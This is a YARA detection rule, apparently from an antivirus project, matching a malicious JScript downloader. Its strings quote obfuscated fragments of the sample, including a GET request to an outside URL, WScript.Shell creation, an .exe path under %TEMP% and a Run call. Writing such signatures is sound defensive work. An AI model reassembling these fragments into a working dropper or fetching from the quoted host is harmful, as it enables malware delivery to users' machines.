rule sig_20160401_21ed35059105314b49257edc5f6db29b {
  meta:
    description = "datamaliciousorder - file 20160401_21ed35059105314b49257edc5f6db29b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "112fac442db4d0ddadbd6ce18651545f76bee9b2c7887718d4395100466746cb"

  strings:
    $s1  = "CqyQx[CmyKv](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "var ZdHs = function OeyYn() {return WScript[ZxXof](\"WScript\"+\".Shell\");}(), CdXw = 11;" fullword ascii
    $s3  = "function JxeYi(AtByt, RtzEtv){YysRj = YysRj * 1; return AtByt - RtzEtv;};" fullword ascii
    $s4  = "if (CqyQx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XpRi() {return ZdHs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"l4gkfla39.ex\" + \"e\";};" fullword ascii
    $s6  = "function UfUz(){return GcSsl + \"\";};" fullword ascii
    $s7  = "function ChTko() {return ((MbpGz == true) && (MbpGz == JkgDxz)) ? 1 : YysRj;};" fullword ascii
    $s8  = "var JkgDxz = false;" fullword ascii
    $s9  = "function GzlQf(AfUy) {var ArlKh = (1, 2, 3, 4, 5, AfUy); return ArlKh;};" fullword ascii
    $s10 = "function CmgUi(){return 23;};" fullword ascii
    $s11 = "JkgDxz = true; " fullword ascii
    $s12 = "MbpGz = true; " fullword ascii
    $s13 = "var MzRs = false;" fullword ascii
    $s14 = "var PhmYkm = new this[\"Date\"]();" fullword ascii
    $s15 = "function PdtEg()" fullword ascii
    $s16 = "function LofNob(TuhYxh){ZdHs[\"R\"+\"un\"](TuhYxh, YysRj, YysRj);};" fullword ascii
    $s17 = "return JxeYi(JzAis, MyGtk);" fullword ascii
    $s18 = "var MbpGz = false;" fullword ascii
    $s19 = "function KbxRy(){return ZxXof;};" fullword ascii
    $s20 = "}while (EodMwo);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}